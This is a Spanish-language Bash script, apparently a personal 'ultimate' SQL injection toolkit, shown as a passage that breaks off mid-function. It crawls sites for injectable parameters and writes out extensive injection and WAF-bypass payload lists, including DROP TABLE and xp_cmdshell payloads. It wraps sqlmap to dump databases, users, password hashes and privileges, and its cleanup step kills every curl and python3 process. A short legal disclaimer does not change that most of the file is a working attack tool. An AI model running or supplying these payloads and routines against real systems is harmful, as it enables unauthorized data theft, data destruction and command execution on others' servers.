#!/bin/bash

# 🗃️ SQLI INJECTION ULTIMATE
# SQL Injection masiva - TODAS las modalidades y bypasses
# Autor: X (sebastian.corao) 
# Fecha: $(date)

# 🔴 ADVERTENCIA LEGAL
echo "
███████╗ ██████╗ ██╗     ██╗    ██╗   ██╗██╗  ████████╗██╗███╗   ███╗ █████╗ ████████╗███████╗
██╔════╝██╔═══██╗██║     ██║    ██║   ██║██║  ╚══██╔══╝██║████╗ ████║██╔══██╗╚══██╔══╝██╔════╝
███████╗██║   ██║██║     ██║    ██║   ██║██║     ██║   ██║██╔████╔██║███████║   ██║   █████╗  
╚════██║██║▄▄ ██║██║     ██║    ██║   ██║██║     ██║   ██║██║╚██╔╝██║██╔══██║   ██║   ██╔══╝  
███████║╚██████╔╝███████╗██║    ╚██████╔╝███████╗██║   ██║██║ ╚═╝ ██║██║  ██║   ██║   ███████╗
╚══════╝ ╚══▀▀═╝ ╚══════╝╚═╝     ╚═════╝ ╚══════╝╚═╝   ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚══════╝
                                                                                              
🗃️ SQLI INJECTION - TODAS LAS MODALIDADES Y BYPASSES 🗃️
"

echo "🔴 ADVERTENCIA LEGAL:"
echo "Este script es SOLO para pentesting autorizado y fines educativos."
echo "SQL Injection contra sitios sin autorización es ILEGAL."
echo "Úsalo bajo tu propia responsabilidad y con permiso explícito."
echo ""
read -p "¿Entiendes y aceptas? (s/N): " acepta
if [[ ! "$acepta" =~ ^[Ss]$ ]]; then
    echo "❌ Operación cancelada"
    exit 1
fi

# Colores
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m' # Sin color

# Variables globales
WORKDIR="sqli_ultimate_results_$(date +%Y%m%d_%H%M%S)"
LOG_FILE="$WORKDIR/sqli_ultimate.log"
SQLMAP_BIN=""
USER_AGENT="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

# Función de limpieza
cleanup() {
    echo ""
    echo -e "${YELLOW}🧹 Limpiando procesos...${NC}"
    pkill -f sqlmap 2>/dev/null || true
    pkill -f curl 2>/dev/null || true
    pkill -f python3 2>/dev/null || true
    echo -e "${GREEN}✅ Limpieza completada${NC}"
}

# Configurar trap para limpieza
trap cleanup EXIT INT TERM

# Verificar herramientas
verificar_herramientas() {
    echo -e "${BLUE}🔍 Verificando herramientas...${NC}"
    
    # Verificar sqlmap
    if command -v sqlmap >/dev/null 2>&1; then
        SQLMAP_BIN="sqlmap"
        echo -e "${GREEN}✅ sqlmap encontrado${NC}"
    elif [[ -f "/usr/bin/sqlmap" ]]; then
        SQLMAP_BIN="/usr/bin/sqlmap"
        echo -e "${GREEN}✅ sqlmap encontrado en /usr/bin${NC}"
    elif [[ -f "/opt/sqlmap/sqlmap.py" ]]; then
        SQLMAP_BIN="python3 /opt/sqlmap/sqlmap.py"
        echo -e "${GREEN}✅ sqlmap encontrado en /opt${NC}"
    else
        echo -e "${RED}❌ sqlmap no encontrado${NC}"
        echo "Instalar con: apt install sqlmap"
        echo "O descargar de: https://github.com/sqlmapproject/sqlmap"
    fi
    
    # Verificar otras herramientas
    command -v curl >/dev/null 2>&1 && echo -e "${GREEN}✅ curl disponible${NC}"
    command -v wget >/dev/null 2>&1 && echo -e "${GREEN}✅ wget disponible${NC}"
    command -v python3 >/dev/null 2>&1 && echo -e "${GREEN}✅ python3 disponible${NC}"
    command -v jq >/dev/null 2>&1 && echo -e "${GREEN}✅ jq disponible${NC}"
    command -v nmap >/dev/null 2>&1 && echo -e "${GREEN}✅ nmap disponible${NC}"
    
    # Verificar bibliotecas python
    python3 -c "import requests" 2>/dev/null && echo -e "${GREEN}✅ python requests disponible${NC}"
    python3 -c "import urllib3" 2>/dev/null && echo -e "${GREEN}✅ python urllib3 disponible${NC}"
    
    echo ""
}

# Configurar directorio de trabajo
configurar_directorio() {
    echo -e "${BLUE}📁 Configurando directorio de trabajo...${NC}"
    
    mkdir -p "$WORKDIR"/{targets,payloads,bypasses,results,reports,scripts,databases}
    
    echo -e "${GREEN}✅ Directorio creado: $WORKDIR${NC}"
    echo ""
}

# Gestión de objetivos
gestionar_objetivos() {
    echo -e "${PURPLE}🎯 GESTIÓN DE OBJETIVOS${NC}"
    echo ""
    echo "Opciones:"
    echo "1) 📝 Agregar URL objetivo manual"
    echo "2) 📂 Importar lista de URLs"
    echo "3) 🔍 Escanear sitio web para parámetros"
    echo "4) 🌐 Crawling automático para endpoints"
    echo "5) 📋 Listar objetivos guardados"
    echo "6) 🗑️ Eliminar objetivos"
    echo "7) ⬅️ Volver al menú principal"
    echo ""
    
    read -p "Selecciona opción [1-7]: " opcion
    
    case $opcion in
        1) agregar_url_manual ;;
        2) importar_urls ;;
        3) escanear_parametros ;;
        4) crawling_automatico ;;
        5) listar_objetivos ;;
        6) eliminar_objetivos ;;
        7) return ;;
        *) echo -e "${RED}❌ Opción inválida${NC}" ;;
    esac
    
    echo ""
    read -p "Presiona Enter para continuar..."
}

# Agregar URL manual
agregar_url_manual() {
    echo -e "${CYAN}📝 AGREGAR URL OBJETIVO${NC}"
    echo ""
    
    echo "Tipos de objetivo:"
    echo "1) GET parameter (ej: site.com/page.php?id=1)"
    echo "2) POST form"
    echo "3) Cookie injection"
    echo "4) HTTP Header injection"
    echo "5) User-Agent injection"
    echo ""
    
    read -p "Tipo [1-5]: " target_type
    read -p "URL base: " base_url
    
    target_file="$WORKDIR/targets/target_$(date +%H%M%S).txt"
    
    case $target_type in
        1)
            read -p "Parámetro vulnerable (ej: id): " param_name
            read -p "Valor del parámetro: " param_value
            
            echo "TYPE:GET" > "$target_file"
            echo "URL:$base_url" >> "$target_file"
            echo "PARAM:$param_name" >> "$target_file"
            echo "VALUE:$param_value" >> "$target_file"
            echo "METHOD:GET" >> "$target_file"
            ;;
            
        2)
            read -p "Datos POST (ej: user=admin&pass=123): " post_data
            
            echo "TYPE:POST" > "$target_file"
            echo "URL:$base_url" >> "$target_file"
            echo "DATA:$post_data" >> "$target_file"
            echo "METHOD:POST" >> "$target_file"
            ;;
            
        3)
            read -p "Nombre de cookie: " cookie_name
            read -p "Valor de cookie: " cookie_value
            
            echo "TYPE:COOKIE" > "$target_file"
            echo "URL:$base_url" >> "$target_file"
            echo "COOKIE:$cookie_name=$cookie_value" >> "$target_file"
            echo "METHOD:COOKIE" >> "$target_file"
            ;;
            
        4)
            read -p "Header a inyectar (ej: X-Forwarded-For): " header_name
            read -p "Valor del header: " header_value
            
            echo "TYPE:HEADER" > "$target_file"
            echo "URL:$base_url" >> "$target_file"
            echo "HEADER:$header_name: $header_value" >> "$target_file"
            echo "METHOD:HEADER" >> "$target_file"
            ;;
            
        5)
            echo "TYPE:USER_AGENT" > "$target_file"
            echo "URL:$base_url" >> "$target_file"
            echo "USER_AGENT:$USER_AGENT" >> "$target_file"
            echo "METHOD:USER_AGENT" >> "$target_file"
            ;;
    esac
    
    echo -e "${GREEN}✅ Objetivo guardado: $target_file${NC}"
}

# Escanear parámetros
escanear_parametros() {
    echo -e "${CYAN}🔍 ESCANEAR PARÁMETROS${NC}"
    echo ""
    
    read -p "URL del sitio web: " site_url
    
    echo -e "${YELLOW}🔍 Escaneando parámetros en $site_url...${NC}"
    
    param_file="$WORKDIR/targets/params_$(date +%H%M%S).txt"
    
    # Usar curl para buscar formularios y parámetros GET
    echo "Descargando página principal..."
    page_content=$(curl -s -L --user-agent "$USER_AGENT" "$site_url" 2>/dev/null)
    
    if [[ -n "$page_content" ]]; then
        echo "Analizando formularios..."
        
        # Buscar formularios POST
        echo "$page_content" | grep -oiE '<form[^>]*action="[^"]*"[^>]*>' | while read -r form_line; do
            action=$(echo "$form_line" | grep -oiE 'action="[^"]*"' | cut -d'"' -f2)
            method=$(echo "$form_line" | grep -oiE 'method="[^"]*"' | cut -d'"' -f2 | tr '[:lower:]' '[:upper:]')
            method=${method:-POST}
            
            # Construir URL completa
            if [[ "$action" =~ ^http ]]; then
                form_url="$action"
            elif [[ "$action" =~ ^/ ]]; then
                domain=$(echo "$site_url" | awk -F/ '{print $1"//"$3}')
                form_url="$domain$action"
            else
                form_url="$site_url/$action"
            fi
            
            echo "TYPE:$method" >> "$param_file"
            echo "URL:$form_url" >> "$param_file"
            echo "METHOD:$method" >> "$param_file"
            echo "---" >> "$param_file"
        done
        
        # Buscar enlaces con parámetros GET
        echo "$page_content" | grep -oiE 'href="[^"]*\?[^"]*"' | cut -d'"' -f2 | while read -r link; do
            if [[ "$link" =~ \? ]]; then
                # Construir URL completa
                if [[ "$link" =~ ^http ]]; then
                    full_url="$link"
                elif [[ "$link" =~ ^/ ]]; then
                    domain=$(echo "$site_url" | awk -F/ '{print $1"//"$3}')
                    full_url="$domain$link"
                else
                    full_url="$site_url/$link"
                fi
                
                echo "TYPE:GET" >> "$param_file"
                echo "URL:$full_url" >> "$param_file"
                echo "METHOD:GET" >> "$param_file"
                echo "---" >> "$param_file"
            fi
        done
        
        if [[ -f "$param_file" ]]; then
            param_count=$(grep -c "URL:" "$param_file" 2>/dev/null || echo "0")
            echo -e "${GREEN}✅ Se encontraron $param_count parámetros potenciales${NC}"
            echo -e "${CYAN}📄 Guardados en: $param_file${NC}"
        else
            echo -e "${YELLOW}⚠️ No se encontraron parámetros obvios${NC}"
        fi
    else
        echo -e "${RED}❌ No se pudo acceder al sitio web${NC}"
    fi
}

# Gestión de payloads
gestionar_payloads() {
    echo -e "${PURPLE}💉 GESTIÓN DE PAYLOADS SQLI${NC}"
    echo ""
    echo "Opciones:"
    echo "1) 📝 Crear payloads personalizados"
    echo "2) 📥 Descargar payloads comunes"
    echo "3) 🔄 Generar payloads por tipo de SQLi"
    echo "4) 🛡️ Crear bypasses para WAF"
    echo "5) 📋 Listar payloads disponibles"
    echo "6) ⬅️ Volver al menú principal"
    echo ""
    
    read -p "Selecciona opción [1-6]: " opcion
    
    case $opcion in
        1) crear_payloads_personalizados ;;
        2) descargar_payloads_comunes ;;
        3) generar_payloads_tipo ;;
        4) crear_bypasses_waf ;;
        5) listar_payloads ;;
        6) return ;;
        *) echo -e "${RED}❌ Opción inválida${NC}" ;;
    esac
    
    echo ""
    read -p "Presiona Enter para continuar..."
}

# Crear payloads personalizados
crear_payloads_personalizados() {
    echo -e "${CYAN}📝 CREAR PAYLOADS PERSONALIZADOS${NC}"
    echo ""
    
    payload_file="$WORKDIR/payloads/custom_payloads_$(date +%H%M%S).txt"
    
    echo "Introduce información para personalizar payloads:"
    read -p "Tipo de base de datos (mysql, mssql, oracle, postgresql): " db_type
    read -p "Nombres de tablas sospechosas (separadas por espacios): " table_names
    read -p "Nombres de columnas sospechosas (separadas por espacios): " column_names
    
    echo -e "${YELLOW}💉 Generando payloads personalizados...${NC}"
    
    # Payloads base por tipo de DB
    case $db_type in
        "mysql")
            cat > "$payload_file" << 'EOF'
# MySQL Specific Payloads
' OR '1'='1
' OR 1=1--
' OR 1=1#
' OR 1=1/*
') OR ('1'='1
') OR (1=1)--
') OR (1=1)#
" OR "1"="1
" OR 1=1--
" OR 1=1#
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 1,2,3--
' UNION SELECT user(),version(),database()--
' UNION SELECT table_name FROM information_schema.tables--
' AND (SELECT COUNT(*) FROM information_schema.tables)>0--
' OR (SELECT user())='root'--
' OR (SELECT @@version) LIKE '5%'--
' OR (SELECT COUNT(*) FROM mysql.user)>0--
'; DROP TABLE users;--
'; INSERT INTO users VALUES ('admin','pass');--
' OR 1=1 INTO OUTFILE '/tmp/sqli.txt'--
' OR 1=1 AND sleep(5)--
' OR 1=1 AND benchmark(1000000,md5(1))--
EOF
            ;;
        "mssql")
            cat > "$payload_file" << 'EOF'
# Microsoft SQL Server Payloads
' OR '1'='1
' OR 1=1--
') OR ('1'='1
') OR (1=1)--
" OR "1"="1
" OR 1=1--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 1,2,3--
' UNION SELECT user_name(),@@version,db_name()--
' UNION SELECT name FROM sys.tables--
' AND (SELECT COUNT(*) FROM sys.tables)>0--
' OR (SELECT user_name())='sa'--
' OR (SELECT @@version) LIKE 'Microsoft%'--
'; EXEC xp_cmdshell('whoami')--
'; EXEC sp_configure 'show advanced options',1--
' OR 1=1; WAITFOR DELAY '00:00:05'--
' OR 1=1 AND (SELECT COUNT(*) FROM sys.databases)>0--
EOF
            ;;
        "oracle")
            cat > "$payload_file" << 'EOF'
# Oracle Database Payloads
' OR '1'='1
' OR 1=1--
') OR ('1'='1
') OR (1=1)--
" OR "1"="1
" OR 1=1--
' UNION SELECT NULL,NULL,NULL FROM dual--
' UNION SELECT 1,2,3 FROM dual--
' UNION SELECT user,version,instance_name FROM v$instance--
' UNION SELECT table_name FROM all_tables--
' AND (SELECT COUNT(*) FROM all_tables)>0--
' OR (SELECT user FROM dual)='SYS'--
' OR 1=1 AND dbms_pipe.receive_message(('a'),5) IS NULL--
' OR 1=1 AND (SELECT COUNT(*) FROM all_users)>0--
EOF
            ;;
        "postgresql")
            cat > "$payload_file" << 'EOF'
# PostgreSQL Payloads
' OR '1'='1
' OR 1=1--
') OR ('1'='1
') OR (1=1)--
" OR "1"="1
" OR 1=1--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 1,2,3--
' UNION SELECT user,version(),current_database()--
' UNION SELECT tablename FROM pg_tables--
' AND (SELECT COUNT(*) FROM pg_tables)>0--
' OR (SELECT user)='postgres'--
' OR 1=1 AND pg_sleep(5)--
' OR 1=1 AND (SELECT COUNT(*) FROM pg_user)>0--
EOF
            ;;
        *)
            cat > "$payload_file" << 'EOF'
# Generic SQL Payloads
' OR '1'='1
' OR 1=1--
' OR 1=1#
') OR ('1'='1
') OR (1=1)--
') OR (1=1)#
" OR "1"="1
" OR 1=1--
" OR 1=1#
' UNION SELECT NULL--
' UNION SELECT 1,2,3--
' AND 1=1--
' AND 1=2--
' OR 'a'='a
' OR 'a'='b
EOF
            ;;
    esac
    
    # Agregar payloads específicos para tablas
    if [[ -n "$table_names" ]]; then
        echo "" >> "$payload_file"
        echo "# Custom table payloads" >> "$payload_file"
        for table in $table_names; do
            echo "' UNION SELECT * FROM $table--" >> "$payload_file"
            echo "' AND (SELECT COUNT(*) FROM $table)>0--" >> "$payload_file"
            echo "' OR (SELECT COUNT(*) FROM $table)>0--" >> "$payload_file"
        done
    fi
    
    # Agregar payloads específicos para columnas
    if [[ -n "$column_names" ]]; then
        echo "" >> "$payload_file"
        echo "# Custom column payloads" >> "$payload_file"
        for column in $column_names; do
            echo "' UNION SELECT $column FROM users--" >> "$payload_file"
            echo "' AND (SELECT $column FROM users LIMIT 1) LIKE '%admin%'--" >> "$payload_file"
        done
    fi
    
    lines=$(wc -l < "$payload_file")
    echo -e "${GREEN}✅ Payloads personalizados creados: $payload_file ($lines payloads)${NC}"
}

# Descargar payloads comunes
descargar_payloads_comunes() {
    echo -e "${CYAN}📥 DESCARGAR PAYLOADS COMUNES${NC}"
    echo ""
    
    cd "$WORKDIR/payloads"
    
    echo "Descargando payloads desde repositorios conocidos..."
    
    # PayloadsAllTheThings
    echo -e "${YELLOW}📥 Descargando PayloadsAllTheThings SQL Injection...${NC}"
    curl -s "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/SQL%20Injection/README.md" -o payloads_all_the_things.md 2>/dev/null || echo "Error descargando PayloadsAllTheThings"
    
    # SecLists SQL Injection
    echo -e "${YELLOW}📥 Descargando SecLists SQL payloads...${NC}"
    curl -s "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/SQLi/Generic-SQLi.txt" -o seclists_generic.txt 2>/dev/null || echo "Error descargando SecLists"
    
    # Crear payload básico si no se pudieron descargar
    if [[ ! -f "seclists_generic.txt" ]]; then
        echo -e "${YELLOW}📝 Creando payloads básicos...${NC}"
        cat > basic_sqli_payloads.txt << 'EOF'
'
"
' OR '1'='1
' OR 1=1--
' OR 1=1#
' OR 1=1/*
" OR "1"="1
" OR 1=1--
" OR 1=1#
') OR ('1'='1
') OR (1=1)--
') OR (1=1)#
") OR ("1"="1
") OR (1=1)--
") OR (1=1)#
' OR 'a'='a
' OR 'a'='b
" OR "a"="a
" OR "a"="b
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 1--
' UNION SELECT 1,2--
' UNION SELECT 1,2,3--
" UNION SELECT NULL--
" UNION SELECT NULL,NULL--
" UNION SELECT NULL,NULL,NULL--
' AND 1=1--
' AND 1=2--
' AND 1=1#
' AND 1=2#
" AND "1"="1
" AND "1"="2
' OR EXISTS(SELECT * FROM users)--
' OR EXISTS(SELECT * FROM admin)--
' OR EXISTS(SELECT * FROM login)--
' OR (SELECT COUNT(*) FROM users)>0--
' OR (SELECT COUNT(*) FROM admin)>0--
' AND (SELECT user())='root'--
' AND (SELECT user()) LIKE 'root%'--
'; EXEC xp_cmdshell('whoami')--
'; EXEC master..xp_cmdshell('whoami')--
' OR 1=1 AND sleep(5)--
' OR 1=1 AND pg_sleep(5)--
' OR 1=1; WAITFOR DELAY '00:00:05'--
' OR 1=1 AND benchmark(1000000,md5(1))--
' OR 1=1 AND dbms_pipe.receive_message(('a'),5) IS NULL--
admin'--
admin'#
admin"--
admin"#
' OR 'x'='x
' OR 'x'='y
" OR "x"="x
" OR "x"="y
') OR ('x'='x
') OR ('x'='y
") OR ("x"="x
") OR ("x"="y
' UNION ALL SELECT NULL--
' UNION ALL SELECT NULL,NULL--
' UNION ALL SELECT NULL,NULL,NULL--
' UNION ALL SELECT 1--
' UNION ALL SELECT 1,2--
' UNION ALL SELECT 1,2,3--
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
' ORDER BY 4--
' ORDER BY 5--
' ORDER BY 1#
' ORDER BY 2#
' ORDER BY 3#
' GROUP BY 1--
' GROUP BY 2--
' GROUP BY 3--
' HAVING 1=1--
' HAVING 1=2--
EOF
    fi
    
    cd - >/dev/null
    echo -e "${GREEN}✅ Payloads comunes descargados${NC}"
}

# Crear bypasses WAF
crear_bypasses_waf() {
    echo -e "${CYAN}🛡️ CREAR BYPASSES PARA WAF${NC}"
    echo ""
    
    bypass_file="$WORKDIR/bypasses/waf_bypasses_$(date +%H%M%S).txt"
    
    echo -e "${YELLOW}🛡️ Generando bypasses para WAF...${NC}"
    
    cat > "$bypass_file" << 'EOF'
# WAF Bypass Payloads
# Case variation
' Or '1'='1
' OR '1'='1
' or '1'='1
' oR '1'='1

# Comment variations
' OR 1=1--
' OR 1=1#
' OR 1=1/*
' OR 1=1;%00
' OR 1=1-- -

# Whitespace variations
'/**/OR/**/1=1--
'%20OR%201=1--
'%09OR%091=1--
'%0aOR%0a1=1--
'%0dOR%0d1=1--
'+OR+1=1--
'%a0OR%a01=1--

# Encoding variations
%27%20OR%20%27%31%27%3D%27%31
%2527%2520OR%2520%2531%253D%2531
%25%32%37%25%32%30%4F%52%25%32%30%25%32%37%25%33%31%25%32%37%25%33%44%25%32%37%25%33%31

# Unicode bypasses
′ OR ′1′=′1
＇ OR ＇1＇=＇1
' Ｏr '1'='1

# Function bypasses
' OR ascii(substring(user(),1,1))>64--
' OR ascii(substr(user(),1,1))>64--
' OR ascii(mid(user(),1,1))>64--
' OR ord(substring(user(),1,1))>64--

# Concatenation bypasses
' OR 'a'||'a'='aa
' OR 'a'++'a'='aa
' OR concat('a','a')='aa
' OR 'a' 'a'='aa

# Mathematical bypasses
' OR 1*1=1--
' OR 2-1=1--
' OR 3/3=1--
' OR 0x31=1--
' OR power(1,1)=1--

# Time delay bypasses
' OR IF(1=1,sleep(5),0)--
' OR IF(ascii(substring(user(),1,1))>64,sleep(5),0)--
' OR CASE WHEN 1=1 THEN pg_sleep(5) ELSE 0 END--
' OR IIF(1=1,1,(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2))--

# Alternative operators
' OR '1' LIKE '1
' OR '1' RLIKE '1
' OR '1' REGEXP '1
' OR 1 BETWEEN 0 AND 2--
' OR 1 IN (1,2,3)--

# Nested queries
' OR (SELECT 1)=1--
' OR (SELECT 1 FROM users)=1--
' OR EXISTS(SELECT 1)--
' OR EXISTS(SELECT 1 FROM users)--

# Alternative syntax
' OR {fn substring(user(),1,1)}='a'--
' OR {d '1900-01-01'}='1900-01-01'--
' OR {t '00:00:00'}='00:00:00'--

# Double URL encoding
%2527%2520%254f%2552%2520%2527%2531%2527%253d%2527%2531

# Mixed case with encoding
%27%20%4f%52%20%27%31%27%3d%27%31
%27%20or%20%27%31%27%3d%27%31

# Buffer overflow attempts
' OR 'A'='A' AND MAKE_SET(FIND_IN_SET(CHAR(95),CHAR(95,95)),CHAR(95))=CHAR(95)--

# Blind injection bypasses
' OR IF(ORD(MID(VERSION(),1,1))>52,BENCHMARK(2000000,SHA1(0xAAAAAA)),0)--
' OR IF(ASCII(SUBSTRING(CURRENT_USER(),1,1))>64,SLEEP(5),0)--

# Scientific notation
' OR 1.e1=10--
' OR 1e1=10--
' OR .1e2=10--

# Alternative quotes
`OR`1`=`1--
´OR´1´=´1--

# Null byte injection
' OR '1'='1'%00--
' OR '1'='1'\x00--

# Tab and newline
'	OR	'1'='1--
'
OR
'1'='1--

# JSON injection bypasses
{"id":"' OR '1'='1' --"}
{"id":"1' UNION SELECT NULL,NULL,NULL--"}

# XML injection bypasses
<id>' OR '1'='1' --</id>
<id>1' UNION SELECT NULL,NULL,NULL--</id>
EOF

    lines=$(wc -l < "$bypass_file")
    echo -e "${GREEN}✅ Bypasses WAF creados: $bypass_file ($lines bypasses)${NC}"
}

# Configuración de ataques
configurar_ataques() {
    echo -e "${PURPLE}⚔️ CONFIGURAR ATAQUES SQLI${NC}"
    echo ""
    
    # Verificar archivos necesarios
    if ! ls "$WORKDIR/targets"/*.txt >/dev/null 2>&1; then
        echo -e "${RED}❌ No hay objetivos configurados${NC}"
        echo "Primero gestiona objetivos."
        return
    fi
    
    if ! ls "$WORKDIR/payloads"/*.txt >/dev/null 2>&1; then
        echo -e "${RED}❌ No hay payloads configurados${NC}"
        echo "Primero gestiona payloads."
        return
    fi
    
    echo "Tipos de ataque SQL Injection:"
    echo "1) 🚀 Detección automática (sqlmap auto)"
    echo "2) 🔍 Union-based injection"
    echo "3) ⏱️ Time-based blind injection"
    echo "4) 🔢 Boolean-based blind injection"
    echo "5) 💥 Error-based injection"
    echo "6) 💉 Manual payload testing"
    echo "7) 🛡️ WAF bypass testing"
    echo "8) 🌊 Ataque completo (todos los métodos)"
    echo "9) ⬅️ Volver al menú principal"
    echo ""
    
    read -p "Selecciona tipo [1-9]: " attack_type
    
    case $attack_type in
        1) ataque_deteccion_auto ;;
        2) ataque_union_based ;;
        3) ataque_time_based ;;
        4) ataque_boolean_based ;;
        5) ataque_error_based ;;
        6) ataque_manual_payloads ;;
        7) ataque_waf_bypass ;;
        8) ataque_completo ;;
        9) return ;;
        *) echo -e "${RED}❌ Opción inválida${NC}" ;;
    esac
}

# Ataque detección automática
ataque_deteccion_auto() {
    echo -e "${CYAN}🚀 DETECCIÓN AUTOMÁTICA CON SQLMAP${NC}"
    echo ""
    
    if [[ -z "$SQLMAP_BIN" ]]; then
        echo -e "${RED}❌ sqlmap no está disponible${NC}"
        return
    fi
    
    # Seleccionar objetivo
    select_target_sqli
    if [[ -z "$selected_target" ]]; then
        return
    fi
    
    # Leer configuración del objetivo
    target_type=$(grep "TYPE:" "$selected_target" | cut -d: -f2)
    target_url=$(grep "URL:" "$selected_target" | cut -d: -f2-)
    
    result_file="$WORKDIR/results/sqlmap_auto_$(date +%H%M%S).txt"
    
    echo -e "${YELLOW}🚀 Iniciando detección automática...${NC}"
    echo "Objetivo: $target_url"
    echo "Tipo: $target_type"
    echo "Salida: $result_file"
    echo ""
    
    # Construir comando sqlmap
    sqlmap_cmd="$SQLMAP_BIN -u '$target_url' --batch --smart --level=3 --risk=2 --random-agent --output-dir='$WORKDIR/results'"
    
    case $target_type in
        "POST")
            post_data=$(grep "DATA:" "$selected_target" | cut -d: -f2-)
            sqlmap_cmd="$sqlmap_cmd --data='$post_data'"
            ;;
        "COOKIE")
            cookie_data=$(grep "COOKIE:" "$selected_target" | cut -d: -f2-)
            sqlmap_cmd="$sqlmap_cmd --cookie='$cookie_data'"
            ;;
        "HEADER")
            header_data=$(grep "HEADER:" "$selected_target" | cut -d: -f2-)
            sqlmap_cmd="$sqlmap_cmd --header='$header_data'"
            ;;
    esac
    
    echo -e "${CYAN}🔍 Ejecutando: $sqlmap_cmd${NC}"
    echo ""
    
    # Ejecutar sqlmap
    eval "$sqlmap_cmd" 2>&1 | tee "$result_file"
    
    # Analizar resultados
    echo ""
    echo -e "${GREEN}📊 ANÁLISIS DE RESULTADOS${NC}"
    
    if grep -q "is vulnerable" "$result_file"; then
        echo -e "${GREEN}🎉 ¡VULNERABILIDAD DETECTADA!${NC}"
        echo ""
        echo -e "${CYAN}Detalles de la vulnerabilidad:${NC}"
        grep -A 5 -B 5 "is vulnerable" "$result_file"
        
        # Ofrecer explotar la vulnerabilidad
        echo ""
        read -p "¿Quieres extraer información de la base de datos? (s/N): " exploit
        if [[ "$exploit" =~ ^[Ss]$ ]]; then
            explotar_vulnerabilidad "$target_url" "$target_type" "$selected_target"
        fi
    else
        echo -e "${YELLOW}⚠️ No se detectaron vulnerabilidades obvias${NC}"
        echo -e "${CYAN}💡 Considera intentar con técnicas manuales o bypasses WAF${NC}"
    fi
    
    echo ""
    echo -e "${CYAN}📄 Resultado completo guardado en: $result_file${NC}"
}

# Explotar vulnerabilidad
explotar_vulnerabilidad() {
    local target_url="$1"
    local target_type="$2"
    local target_file="$3"
    
    echo -e "${CYAN}💥 EXPLOTANDO VULNERABILIDAD${NC}"
    echo ""
    
    echo "¿Qué información quieres extraer?"
    echo "1) 📊 Información básica (usuarios, versión, databases)"
    echo "2) 📋 Listar todas las bases de datos"
    echo "3) 📋 Listar tablas de una base de datos"
    echo "4) 📋 Listar columnas de una tabla"
    echo "5) 💎 Extraer datos de una tabla"
    echo "6) 👑 Intentar obtener acceso de administrador"
    echo "7) 🎯 Todo lo anterior (ataque completo)"
    echo ""
    
    read -p "Selecciona [1-7]: " exploit_type
    
    exploit_result="$WORKDIR/results/exploit_$(date +%H%M%S).txt"
    
    # Construir base del comando
    base_cmd="$SQLMAP_BIN -u '$target_url' --batch --random-agent"
    
    case $target_type in
        "POST")
            post_data=$(grep "DATA:" "$target_file" | cut -d: -f2-)
            base_cmd="$base_cmd --data='$post_data'"
            ;;
        "COOKIE")
            cookie_data=$(grep "COOKIE:" "$target_file" | cut -d: -f2-)
            base_cmd="$base_cmd --cookie='$cookie_data'"
            ;;
        "HEADER")
            header_data=$(grep "HEADER:" "$target_file" | cut -d: -f2-)
            base_cmd="$base_cmd --header='$header_data'"
            ;;
    esac
    
    case $exploit_type in
        1)
            echo -e "${YELLOW}📊 Extrayendo información básica...${NC}"
            eval "$base_cmd --current-user --current-db --hostname --is-dba" 2>&1 | tee "$exploit_result"
            ;;
        2)
            echo -e "${YELLOW}📋 Listando bases de datos...${NC}"
            eval "$base_cmd --dbs" 2>&1 | tee "$exploit_result"
            ;;
        3)
            read -p "Nombre de la base de datos: " db_name
            echo -e "${YELLOW}📋 Listando tablas de $db_name...${NC}"
            eval "$base_cmd -D '$db_name' --tables" 2>&1 | tee "$exploit_result"
            ;;
        4)
            read -p "Nombre de la base de datos: " db_name
            read -p "Nombre de la tabla: " table_name
            echo -e "${YELLOW}📋 Listando columnas de $table_name...${NC}"
            eval "$base_cmd -D '$db_name' -T '$table_name' --columns" 2>&1 | tee "$exploit_result"
            ;;
        5)
            read -p "Nombre de la base de datos: " db_name
            read -p "Nombre de la tabla: " table_name
            read -p "Columnas a extraer (separadas por comas): " columns
            echo -e "${YELLOW}💎 Extrayendo datos de $table_name...${NC}"
            eval "$base_cmd -D '$db_name' -T '$table_name' -C '$columns' --dump" 2>&1 | tee "$exploit_result"
            ;;
        6)
            echo -e "${YELLOW}👑 Intentando obtener privilegios de administrador...${NC}"
            eval "$base_cmd --privileges --roles --passwords" 2>&1 | tee "$exploit_result"
            ;;
        7)
            echo -e "${YELLOW}🎯 Iniciando explotación completa...${NC}"
            echo "Esto puede tardar mucho tiempo..."
            
            # Información básica
            echo -e "${CYAN}Paso 1: Información básica${NC}"
            eval "$base_cmd --current-user --current-db --hostname --is-dba" 2>&1 | tee -a "$exploit_result"
            
            # Bases de datos
            echo -e "${CYAN}Paso 2: Bases de datos${NC}"
            eval "$base_cmd --dbs" 2>&1 | tee -a "$exploit_result"
            
            # Usuarios y contraseñas
            echo -e "${CYAN}Paso 3: Usuarios y contraseñas${NC}"
            eval "$base_cmd --users --passwords" 2>&1 | tee -a "$exploit_result"
            
            # Privilegios
            echo -e "${CYAN}Paso 4: Privilegios${NC}"
            eval "$base_cmd --privileges --roles" 2>&1 | tee -a "$exploit_result"
            ;;
    esac
    
    echo ""
    echo -e "${GREEN}✅ Explotación completada${NC}"
    echo -e "${CYAN}📄 Resultados guardados en: $exploit_result${NC}"
}

# Ataque manual con payloads
ataque_manual_payloads() {
    echo -e "${CYAN}💉 ATAQUE MANUAL CON PAYLOADS${NC}"
    echo ""
    
    # Seleccionar objetivo
    select_target_sqli
    if [[ -z "$selected_target" ]]; then
        return
    fi
    
    # Seleccionar payloads
    select_payload_file
    if [[ -z "$selected_payload_file" ]]; then
        return
    fi
    
    # Leer configuración
    target_url=$(grep "URL:" "$selected_target" | cut -d: -f2-)
    target_type=$(grep "TYPE:" "$selected_target" | cut -d: -f2)
    
    result_file="$WORKDIR/results/manual_payloads_$(date +%H%M%S).txt"
    
